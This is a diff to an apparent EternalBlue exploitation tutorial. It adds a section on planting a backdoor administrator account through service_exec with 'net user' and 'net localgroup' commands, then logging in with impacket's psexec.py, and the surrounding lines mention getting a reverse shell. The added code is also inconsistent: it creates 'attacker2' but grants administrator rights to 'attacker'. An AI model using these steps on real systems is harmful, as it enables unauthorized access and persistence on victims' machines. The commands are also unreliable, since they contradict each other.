@@ -114,6 +114,16 @@ Finaly we need to host the script somehow. For this go into the folder where the
 We will need 3 command window for this to work. one to host our server, one for the listener and one which will execute theexploit itself.
 [InvokeExploit](/img/EternalBlue/invoke.PNG)
 We can see it worked. pulled the file from our server and we got the reverse shell back.
+<h3>More sneaky</h3>
+What if we do not want to connect back to our machine to download something, or simple we cannot somehow. We can be much more sneaky. Instead of loading in a reverse shell, we can simply create a new administrator.
+This way we will have working admin credentials on the machine and we can connect to it with RDP or psexec. Let's take a look.
+```service_exec(conn, r"cmd /c net user attacker2 PassW123 /add")
+service_exec(conn, r"cmd /c net localgroup administrators attacker /add")```
+Only these two lines are needed in our function and we already added a new administrator user. You will see errors while executing the command. But no worry it is fine in this case.
+[addedUser](/img/EternalBlue/adduser.PNG)
+Let's execute psexec from our impacket to connect to the machine as an administrator. Go to impacket/examples then run:
+```python psexec.py attacker:PassW123@10.0.2.15```
+[psexec](/img/EternalBlue/psexec.PNG)
 <br>
 
 
